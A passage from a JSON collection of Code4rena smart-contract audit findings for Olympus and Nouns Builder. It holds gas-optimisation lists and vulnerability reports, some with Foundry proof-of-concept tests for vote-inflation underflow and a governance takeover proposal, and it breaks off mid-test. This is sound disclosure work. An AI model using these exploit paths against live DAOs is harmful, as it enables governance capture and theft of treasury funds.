gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)), and to avoid Gsset (20000 gas) when changing from \u2018false\u2019 to \u2018true\u2019, after having been \u2018true\u2019 in the past   #### Findings: ``` src/modules/PRICE.sol:L62    bool public initialized; src/policies/Heart.sol:L33    bool public active;  src/policies/Operator.sol:L63    bool public initialized;  src/policies/Operator.sol:L66    bool public active;  src/policies/BondCallback.sol:L24    mapping(address => mapping(uint256 => bool)) public approvedMarkets;  src/policies/Governance.sol:L105    mapping(uint256 => bool) public proposalHasBeenActivated;  src/policies/Governance.sol:L117    mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; ```  ###  [G-02] Cache Array Length Outside of Loop   #### Impact Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop.   #### Findings: ``` src/policies/Governance.sol:L278        for (uint256 step; step < instructions.length; ) { ```  ### [G-03] Empty blocks should be removed or emit something   #### Impact The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting.   #### Findings: ``` src/modules/VOTES.sol:L19    {}  src/modules/TRSRY.sol:L45    constructor(Kernel kernel_) Module(kernel_) {}  src/modules/INSTR.sol:L20    constructor(Kernel kernel_) Module(kernel_) {}  src/policies/PriceConfig.sol:L15    constructor(Kernel kernel_) Policy(kernel_) {}  src/policies/VoterRegistration.sol:L16    constructor(Kernel kernel_) Policy(kernel_) {}  src/policies/TreasuryCustodian.sol:L24    constructor(Kernel kernel_) Policy(kernel_) {}  src/policies/Governance.sol:L59    constructor(Kernel kernel_) Policy(kernel_) {}  ``` ### [G-04] Use a more recent version of solidity.   #### Impact Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining  Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads  Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than revert()/require() strings  Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value.   #### Findings: ``` src/interfaces/IBondCallback.sol:L2      pragma solidity >=0.8.0;  src/policies/interfaces/IOperator.sol:L2      pragma solidity >=0.8.0;  src/policies/interfaces/IHeart.sol:L2      pragma solidity >=0.8.0; ```  ### [G-05] Functions guaranteed to revert when called by normal users can be declared as payable.   #### Impact If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost.   #### Findings: ``` src/policies/Heart.sol:L130    function resetBeat() external onlyRole(\"heart_admin\") {  src/policies/Heart.sol:L135    function toggleBeat() external onlyRole(\"heart_admin\") {  src/policies/Heart.sol:L150    function withdrawUnspentRewards(ERC20 token_) external onlyRole(\"heart_admin\") {  src/policies/VoterRegistration.sol:L45    function issueVotesTo(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {  src/policies/VoterRegistration.sol:L53    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {  src/policies/Operator.sol:L195    function operate() external override onlyWhileActive onlyRole(\"operator_operate\") {  src/policies/Operator.sol:L510    function setThresholdFactor(uint256 thresholdFactor_) external onlyRole(\"operator_policy\") {  src/policies/Operator.sol:L516    function setCushionFactor(uint32 cushionFactor_) external onlyRole(\"operator_policy\") {  src/policies/Operator.sol:L548    function setReserveFactor(uint32 reserveFactor_) external onlyRole(\"operator_policy\") {  src/policies/Operator.sol:L598    function initialize() external onlyRole(\"operator_admin\") {  src/policies/Operator.sol:L618    function regenerate(bool high_) external onlyRole(\"operator_admin\") {  src/policies/Operator.sol:L624    function toggleActive() external onlyRole(\"operator_admin\") {  src/policies/BondCallback.sol:L152    function batchToTreasury(ERC20[] memory tokens_) external onlyRole(\"callback_admin\") {  src/policies/BondCallback.sol:L190    function setOperator(Operator operator_) external onlyRole(\"callback_admin\") {  ```  ### [G-06] ```X += Y``` costs more gas than ```X = X + Y``` for state variables.   #### Impact Consider changing ```X += Y``` to ```X = X + Y``` to save gas.   #### Findings: ``` src/modules/VOTES.sol:L58            balanceOf[to_] += amount_;  src/modules/PRICE.sol:L136            _movingAverage += (currentPrice - earliestPrice) / numObs;  src/modules/PRICE.sol:L222            total += startObservations_[i];  src/modules/TRSRY.sol:L96        reserveDebt[token_][msg.sender] += amount_;  src/modules/TRSRY.sol:L97        totalDebt[token_] += amount_;  src/modules/TRSRY.sol:L131        if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;  src/policies/Heart.sol:L103        lastBeat += frequency();  src/policies/BondCallback.sol:L143        _amountsPerMarket[id_][0] += inputAmount_;  src/policies/BondCallback.sol:L144        _amountsPerMarket[id_][1] += outputAmount_;  src/policies/Governance.sol:L198        totalEndorsementsForProposal[proposalId_] += userVotes;  src/policies/Governance.sol:L252            yesVotesForProposal[activeProposal.proposalId] += userVotes;  src/policies/Governance.sol:L254            noVotesForProposal[activeProposal.proposalId] += userVotes;  ``` ### [G-07] ++i costs less gas than i++, especially when it's used in for loops.   #### Impact Saves 6 gas per instance.   #### Findings: ``` src/policies/Operator.sol:L488            decimals++;  src/policies/Operator.sol:L670                _status.low.count++;  src/policies/Operator.sol:L686                _status.high.count++;  src/utils/KernelUtils.sol:L49            i++;  src/utils/KernelUtils.sol:L64            i++; ```  ### [G-08] Using private rather than public for constants to saves gas.   #### Impact If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table.   #### Findings: ``` src/modules/PRICE.sol:L59    uint8 public constant decimals = 18;  src/modules/RANGE.sol:L65    uint256 public constant FACTOR_SCALE = 1e4;  src/policies/Operator.sol:L89    uint32 public constant FACTOR_SCALE = 1e4;  src/policies/Governance.sol:L121    uint256 public constant SUBMISSION_REQUIREMENT = 100;  src/policies/Governance.sol:L124    uint256 public constant ACTIVATION_DEADLINE = 2 weeks;  src/policies/Governance.sol:L127    uint256 public constant GRACE_PERIOD = 1 weeks;  src/policies/Governance.sol:L130    uint256 public constant ENDORSEMENT_THRESHOLD = 20;  src/policies/Governance.sol:L133    uint256 public constant EXECUTION_THRESHOLD = 33;  src/policies/Governance.sol:L137    uint256 public constant EXECUTION_TIMELOCK = 3 days; ```  ### [G-09] Explicit initialization with zero not required   #### Impact Explicit initialization with zero is not required for variable declaration because uints are 0 by default. Removing this will reduce contract size and save a bit of gas.   #### Findings: ``` src/utils/KernelUtils.sol:L43    for (uint256 i = 0; i < 5; ) {  src/utils/KernelUtils.sol:L58    for (uint256 i = 0; i < 32; ) { ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/3", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "### description  calldata should be used instead of memory for function parameters saves gas if the function argument is only read.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L393  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205  https://github.com/code-423n4/2022-08-olympus/blob/main/src/interfaces/IBondTeller.sol#L43"}, {"title": "Malicious pausing the contract", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/719", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L204 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L206 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L235   # Vulnerability details  # Vulnerability details  ## Description  There is a function `_createAuction` in `Auction` contract.  It consist the following logic:  ``` /// @dev Creates an auction for the next token function _createAuction() private {     // Get the next token available for bidding     try token.mint() returns (uint256 tokenId) {         **creating of the auction for token with id equal to tokenId**          // Pause the contract if token minting failed     } catch Error(string memory) {         _pause();     } } ```  According to the [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md) `call` opcode can consume as most `63/64` of parrent calls' gas. That means `token.mint()` can fail since there will be no gas.   All in all, if `token.mint()` fail on gas and the rest gas is enough for pausing the contract by calling `_pause` in `catch` statement the contract will be paused.  Please note, that a bug can be exploitable if the token.mint() consume more than 1.500.000 of gas, because 1.500.000 / 64 > 20.000 that need to pause the contract. Also, the logic of `token.mint()` includes traversing the array up to 100 times, that's heavy enough to reach 1.500.000 gas limit.   ## Impact  Contract can be paused by any user by passing special amount of gas for the call of `settleCurrentAndCreateNewAuction` (which consists of two internal calls of `_settleAuction` and `_createAuction` functions).  ## Recommended Mitigation Steps  Add a special check for upper bound of `gasLeft` at start of `_createAuction` function."}, {"title": "State function does not require majority of votes for supporting and passing a proposal", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/626", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L413-L456   # Vulnerability details  ## Impact When determining the proposal's state, the following `state` function is called, which can execute `else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) { return ProposalState.Defeated; }`. If `proposal.forVotes` and `proposal.againstVotes` are the same, the proposal is not considered defeated when the quorum votes are reached by the for votes. However, many electoral systems require that the for votes to be more than the against votes in order to conclude that the proposal is passed because the majority of votes supports it. If the deployed DAO wants to require the majority of votes to support a proposal in order to pass it, the `state` function would incorrectly conclude that the proposal is not defeated when the for votes and against votes are the same at the end of voting. As a result, critical proposals, such as for updating implementations or withdrawing funds from the treasury, that should not be passed can be passed, or vice versa, so the impact can be huge.  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L413-L456 ```solidity     function state(bytes32 _proposalId) public view returns (ProposalState) {         // Get a copy of the proposal         Proposal memory proposal = proposals[_proposalId];          // Ensure the proposal exists         if (proposal.voteStart == 0) revert PROPOSAL_DOES_NOT_EXIST();          // If the proposal was executed:         if (proposal.executed) {             return ProposalState.Executed;              // Else if the proposal was canceled:         } else if (proposal.canceled) {             return ProposalState.Canceled;              // Else if the proposal was vetoed:         } else if (proposal.vetoed) {             return ProposalState.Vetoed;              // Else if voting has not started:         } else if (block.timestamp < proposal.voteStart) {             return ProposalState.Pending;              // Else if voting has not ended:         } else if (block.timestamp < proposal.voteEnd) {             return ProposalState.Active;              // Else if the proposal failed (outvoted OR didn't reach quorum):         } else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {             return ProposalState.Defeated;              // Else if the proposal has not been queued:         } else if (settings.treasury.timestamp(_proposalId) == 0) {             return ProposalState.Succeeded;              // Else if the proposal can no longer be executed:         } else if (settings.treasury.isExpired(_proposalId)) {             return ProposalState.Expired;              // Else the proposal is queued         } else {             return ProposalState.Queued;         }     } ```  ## Proof of Concept Please append the following test in `test\\Gov.t.sol`. This test will pass to demonstrate the described scenario.  ```solidity     function test_ProposalIsSucceededWhenNumberOfForAndAgainstVotesAreSame() public {         vm.prank(founder);         auction.unpause();          createVoters(7, 5 ether);          vm.prank(address(treasury));         governor.updateQuorumThresholdBps(2000);          bytes32 proposalId = createProposal();          vm.warp(block.timestamp + governor.votingDelay());          // number of for and against votes are both 2         castVotes(proposalId, 2, 2, 3);          vm.warp(block.timestamp + governor.votingPeriod());          // the proposal is considered succeeded when number of for and against votes are the same after voting ends         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Succeeded));          // the proposal can be queued afterwards         governor.queue(proposalId);         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Queued));     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps If there is no need to pass a proposal when `proposal.forVotes` and `proposal.againstVotes` are the same at the end of voting, then https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441-L442 can be changed to the following code. ```solidity         } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {             return ProposalState.Defeated; ```  Otherwise, a governance configuration can be added to indicate whether the majority of votes is needed or not for supporting and passing a proposal. The `state` function then could return `ProposalState.Defeated` when `proposal.forVotes <= proposal.againstVotes` if so and when `proposal.forVotes < proposal.againstVotes` if not."}, {"title": "Index out of bounds error when properties length is more than attributes length breaks minting", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/523", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L188-L198   # Vulnerability details  ## Description  When a token is minted, the ```MetadataRenderer.sol``` ```onMinted``` function is called which will set the particular token's attributes to a random item from one of the properties. A token has a maximum of 16 attributes, the first one being the total number of properties. The properties from which the token receives its attributes are supplied by the owner of the ```MetadataRenderer.sol``` contract by calling ```addProperties```. The issue is that the number of properties the owner can supply is not limited. If the number of properties is more than 15 then the ```onMinted``` function will revert due to the limit on the number of attributes a token may have.  ## Impact  Since ```onMinted``` is always called when tokens are minted, the DAO will not be able to mint new tokens. There does not seem to be a way to remove properties so this would be unrecoverable.  ## Proof of Concept  Test code added to ```Token.t.sol```: ```solidity     function test_MetadataProperties() public {         createUsers(2, 1 ether);          address[] memory wallets = new address[](2);         uint256[] memory percents = new uint256[](2);         uint256[] memory vestExpirys = new uint256[](2);          uint256 pct = 50;         uint256 end = 4 weeks;          unchecked {             for (uint256 i; i < 2; ++i) {                 wallets[i] = otherUsers[i];                 percents[i] = pct;                 vestExpirys[i] = end;             }         }          deployWithCustomFounders(wallets, percents, vestExpirys);          // Check deployed correctly         assertEq(token.totalFounders(), 2);         assertEq(token.totalFounderOwnership(), 100);          // Create 16 properties and items         string[] memory names = new string[](16);         MetadataRendererTypesV1.ItemParam[] memory items = new MetadataRendererTypesV1.ItemParam[](16);         for (uint256 j; j < 16; j++) {             names[j] = \"aaa\";                                                                               // Add random properties             items[j].name = \"aaa\";                                                                          // Add random items             items[j].propertyId = uint16(j);                                                                // Make sure all properties have items             items[j].isNewProperty = true;         }          MetadataRendererTypesV1.IPFSGroup memory group = MetadataRendererTypesV1.IPFSGroup(             \"aaa\",             \"aaa\"         );                                                                                                  // Add random IPFS group          // Add 16 properties         vm.prank(otherUsers[0]);         metadataRenderer.addProperties(names, items, group);          // Attempt to mint         vm.prank(address(auction));         vm.expectRevert(stdError.indexOOBError);         token.mint();     } ```  The test code above shows that the owner of ```MetadataRenderer.sol``` is able to add 16 properties with 1 items each. The ```auction``` contract is then unable to mint due to an \"Index out of bounds\" error.  Code from the ```onMinted``` function in ```MetadataRenderer.sol```: ```solidity             // For each property:             for (uint256 i = 0; i < numProperties; ++i) {                 // Get the number of items to choose from                 uint256 numItems = properties[i].items.length;                  // Use the token's seed to select an item                 tokenAttributes[i + 1] = uint16(seed % numItems);                  // Adjust the randomness                 seed >>= 16;             } ```  The code above shows that when a token is minted and ```onMinted``` is called it will attempt to assign more than 16 attributes to the token which is not possible due to the ```tokenAttributes``` being limited to 16.  ## Recommended Mitigation Steps  The maximum amount of properties an owner can add should be less than the maximum amount of attributes any token can have. Consider either limiting the ```properties``` variable in ```MetadataRenderer.sol``` to 15 or allow any number of attributes to be added to a token."}, {"title": "Proposals can be bricked and Auctions stalled by bad settings", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/482", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L588   # Vulnerability details  ## Impact  The protocol assumes founders and proposals will set sane settings. However there are some settings that if set incorrectly will block proposals from being created or succeeding and block auctions from completing.  This vulnerability has a low likelihood of occurrence as the outcome is not in the interest of the community. However the possibility exists if there is some misunderstanding or miscalculation. If a bad setting is allowed the impact is high.  ## Proof of Concept  ### Bricking governance proposals  **Governor settings.quorumThresholdBps > 10_000**  If `quorumThresholdBps` is set above 10_000 then it would be impossible to get enough votes to succeed.  Without being able to execute a proposal the setting itself could never be fixed.  **Governor settings.proposalThresholdBps > 10_000**  If `proposalThresholdBps` is set above 10_000 then it would be impossible to submit a proposal.  Without being able to submit a proposal the setting itself could never be fixed.  ### Stalling a governance proposal  **Treasury settings.delay**  A very large value for `delay` would prevent a proposal from being executed.  For example 1000 years easily fits into `delay` and would result in a 1000 year wait before being able to execute.  A governance proposal could fix this property for future proposals but any proposal created with the large `delay` would remain stuck.  ### Stalling the auction  **Auction settings.duration**  The `duration` value is in seconds and any value up to type(uint40).max is permitted.  That is `1099511627775` seconds which is > 48000 years.  A large value like this would stop the auction from ever ending and thus stop new NFTs from being minted.  A governance proposal could fix this setting but ideally a very large `duration` would be blocked.  **Auction settings.timeBuffer**  Similar to duration but applies to the auction endTime extention.  So the auction could be extended a number of years for example.  ## Tools Used  Manual review.  ## Recommended Mitigation Steps  Implement reasonable range bounds reverting where appropriate. In particular for the above apply: - Governor settings `quorumThresholdBps` <= 10_000 - Governor settings `proposalThresholdBps` <= 10_000 - Treasury settings `delay` <= 6 months - Auction settings `duration` <= 6 months - Auction settings `timeBuffer` <= 6 months  Add these checks to the `initialize()` functions and in the setter / update functions where these individual settings properties can be updated. "}, {"title": "NFT owner can block token burning and transfer by delegating to zero address", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/478", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190   # Vulnerability details  ERC721Votes's delegate() and delegateBySig() allow the delegation to zero address, which result in owner's votes elimination in the checkpoint. I.e. the votes are subtracted from the owner, but aren't added anywhere. _moveDelegateVotes() invoked by _delegate() treats the corresponding call as a burning, erasing the votes.  The impact is that the further transfer and burning attempts for the ids of the owner will be reverted because _afterTokenTransfer() callback will try to reduce owner's votes, which are already zero, reverting the calls due to subtraction fail.  As ERC721Votes is parent to Token the overall impact is governance token burning and transfer being disabled whenever the owner delegated to zero address. This can be done deliberately, i.e. any owner can disable burning and transfer of the owned ids at any moment, which can interfere with governance voting process.  ## Proof of Concept  User facing delegate() and delegateBySig() allow for zero address delegation:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135  ```solidity     /// @notice Delegates votes to an account     /// @param _to The address delegating votes to     function delegate(address _to) external {         _delegate(msg.sender, _to);     } ```  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L144-L174  ```solidity     function delegateBySig(         address _from,         address _to,         uint256 _deadline,         uint8 _v,         bytes32 _r,         bytes32 _s     ) external {         // Ensure the signature has not expired         if (block.timestamp > _deadline) revert EXPIRED_SIGNATURE();          // Used to store the digest         bytes32 digest;          // Cannot realistically overflow         unchecked {             // Compute the hash of the domain seperator with the typed delegation data             digest = keccak256(                 abi.encodePacked(\"\\x19\\x01\", DOMAIN_SEPARATOR(), keccak256(abi.encode(DELEGATION_TYPEHASH, _from, _to, nonces[_from]++, _deadline)))             );         }          // Recover the message signer         address recoveredAddress = ecrecover(digest, _v, _r, _s);          // Ensure the recovered signer is the voter         if (recoveredAddress == address(0) || recoveredAddress != _from) revert INVALID_SIGNATURE();          // Update the delegate         _delegate(_from, _to);     } ```  And pass zero address to the _delegate() where it is being set:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190  ```solidity     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  In this case _moveDelegateVotes() will reduce the votes from the owner, not adding it to anywhere as `_from` is the owner, while `_to` is zero address:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L203-L220  ```solidity             if (_from != _to && _amount > 0) {                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 }                  // If this isn't a token burn:                 if (_to != address(0)) { // @ audit here we add the votes to the target, but only if it's not zero address ```  The owner might know that and can use such a delegation to interfere with the system by prohibiting of transferring/burning of his ids.  This happens via _afterTokenTransfer() reverting as it's becomes impossible to reduce owner's votes balance by `1`:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L271  ```solidity     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient         _moveDelegateVotes(_from, _to, 1);          super._afterTokenTransfer(_from, _to, _tokenId);     } ```  ## Recommended Mitigation Steps  Consider prohibiting zero address as a delegation destination:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190  ```solidity     function _delegate(address _from, address _to) internal { +  if (_to == address(0)) revert INVALID_SIGNATURE();          // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  When `_to` isn't zero there always be an addition in _moveDelegateVotes(), so the system votes balance will be sustained.    "}, {"title": "Use can get unlimited votes", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268   # Vulnerability details  ## Impact  `aftertokenTransfer` in ERC721Votes transfers votes between user addresses instead of the delegated addresses, so a user can cause overflow in `_moveDelegates` and get unlimited votes  ## Proof of Concept  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268  ```     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient         _moveDelegateVotes(_from, _to, 1);          super._afterTokenTransfer(_from, _to, _tokenId);     } ``` https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L216  ```     _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     ...     unchecked {                 ...                 // Update their voting weight                 _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);             } ``` During delegation `balanceOf(from)` amount of votes transferred are to the `_to` address  ```     function test_UserCanGetUnlimitedVotes() public {          vm.prank(founder);         auction.unpause();          vm.prank(bidder1);         auction.createBid{ value: 1 ether }(2);          vm.warp(10 minutes + 1 seconds);          auction.settleCurrentAndCreateNewAuction();                  assertEq(token.ownerOf(2), bidder1);          console.log(token.getVotes(bidder1)); // 1         console.log(token.delegates(bidder1)); // 0 bidder1          vm.prank(bidder1);         token.delegate(bidder2);          console.log(token.getVotes(bidder1)); // 1         console.log(token.getVotes(bidder2)); // 1          vm.prank(bidder1);         auction.createBid{value: 1 ether}(3);          vm.warp(22 minutes);          auction.settleCurrentAndCreateNewAuction();          assertEq(token.ownerOf(3), bidder1);          console.log(token.balanceOf(bidder1)); // 2         console.log(token.getVotes(bidder1)); // 2         console.log(token.getVotes(bidder2)); // 1          vm.prank(bidder1);                 token.delegate(bidder1);          console.log(token.getVotes(bidder1)); // 4         console.log(token.getVotes(bidder2)); // 6277101735386680763835789423207666416102355444464034512895        } ```  When user1 delegates to another address `balanceOf(user1)` amount of tokens are subtraced from user2's votes, this will cause underflow and not revert since the statements are unchecked  ## Tools Used  foundry  ## Recommended Mitigation Steps  Change delegate transfer in `afterTokenTransfer` to   ```         _moveDelegateVotes(delegates(_from), delegates(_to), 1); ```  "}, {"title": "Auction parameters can be changed during ongoing auction", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/450", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L307-L335   # Vulnerability details  ## Impact  The auction parameters can be changed anytime, even during ongoing auctions, and take effect immediately. Users may need time to react to the changes. The impacts maybe followings: - some sudden changes may cause bidder's transaction fail, such as `setReservePrice()` and `setMinimumBidIncrement()` - some changes may change users expectation about the auction, such as `setDuration()` and `setTimeBuffer()`, with different time parameters, bidders will use different strategy   ## Proof of Concept  src/auction/Auction.sol ```solidity     function setDuration(uint256 _duration) external onlyOwner {         settings.duration = SafeCast.toUint40(_duration);          emit DurationUpdated(_duration);     }      function setReservePrice(uint256 _reservePrice) external onlyOwner {         settings.reservePrice = _reservePrice;          emit ReservePriceUpdated(_reservePrice);     }      function setTimeBuffer(uint256 _timeBuffer) external onlyOwner {         settings.timeBuffer = SafeCast.toUint40(_timeBuffer);          emit TimeBufferUpdated(_timeBuffer);     }      function setMinimumBidIncrement(uint256 _percentage) external onlyOwner {         settings.minBidIncrement = SafeCast.toUint8(_percentage);          emit MinBidIncrementPercentageUpdated(_percentage);     }```   ## Tools Used Manual analysis.  ## Recommended Mitigation Steps  - do not apply changed parameters on ongoing auctions  - add a timelock for the changes  "}, {"title": "A proposal can pass with 0 votes in favor at early DAO stages", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/436", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441   # Vulnerability details  It's possible to create a proposal for a DAO as soon as it's deployed and the proposal can pass even if nobody votes.  This possibility of doing so is based on the following assumptions: 1. The vetoer doesn't veto the proposal 2. `proposal.quorumVotes` is 0, which happens when `token.totalSupply() * settings.quorumThresholdBps < 10_000` 3. `proposal.proposalThreshold` is 0, which happens when `token.totalSupply() * settings.proposalThresholdBps < 10_000`  The amount of time necessary to create and execute a proposal of this kind is dictated by `governor.settings.votingDelay + governor.settings.votingDelay + treasury.delay()`, the lower the time the higher the risk.  ## Impact A malicious actor could build an off-chain script that tracks `DAODeployed` events on the `Manager.sol` contract. Every time a new DAO is spawned the script submits a proposal. This attack is based on the fact that such at an early stage nobody might notice and the chances of this happening are made real because every new DAO can be targeted.   A potential proposal created by an attacker might look like this: 1. Call `governor.updateVetoer(attacker)` 1. Call `governor.updateVotingDelay(0)` 2. Call `governor.updateVotingPeriod(0)` 3. Call `treasury.updateGracePeriod(0)` 4. Call `treasury.updateDelay(1 day)`  With this setup the attacker can make a proposal and queue it immediately to then execute it after 1 day time; which gives him the time to veto any proposal that tries to interfere with the attack. At this point the attacker has sudo powers and if there's any bid he can take the funds.  This is just one possible attack path, but the point is making a proposal pass can give an attacker sudo powers and nobody might notice for a while.  ## Proof of Concept Here's a test I wrote that proves the attack path outlined above, you can copy it into `Gov.t.sol` and execute it with `forge test -m test_sneakProposalAttack`:  ```javascript  function test_sneakProposalAttack() public {         address attacker = vm.addr(0x55);          address[] memory targets = new address[](5);         uint256[] memory values = new uint256[](5);         bytes[] memory calldatas = new bytes[](5);          // 1. Call `governor.updateVetoer(attacker)`         targets[0] = address(governor);         values[0] = 0;         calldatas[0] = abi.encodeWithSignature(\"updateVetoer(address)\", attacker);          // 2. Call `governor.updateVotingDelay(0)`         targets[1] = address(governor);         values[1] = 0;         calldatas[1] = abi.encodeWithSignature(\"updateVotingDelay(uint256)\", 0);          //3. Call `governor.updateVotingPeriod(0)`         targets[2] = address(governor);         values[2] = 0;         calldatas[2] = abi.encodeWithSignature(\"updateVotingPeriod(uint256)\", 0);          //3. Call `treasury.updateGracePeriod(0)`         targets[3] = address(treasury);         values[3] = 0;         calldatas[3] = abi.encodeWithSignature(\"updateGracePeriod(uint256)\", 0);          //4. Call `treasury.updateDelay(1 day)`         targets[4] = address(treasury);         values[4] = 0;         calldatas[4] = abi.encodeWithSignature(\"updateDelay(uint256)\", 60 * 60 * 24);          //Attacker creates proposal as soon as contract is deployed         bytes32 proposalId = governor.propose(targets, values, calldatas, \"\");          //Wait for proposal.voteEnd         vm.warp((governor.getProposal(proposalId).voteEnd));          //Queue it         governor.queue(proposalId);          //Wait for treasury delay         vm.warp(block.timestamp + 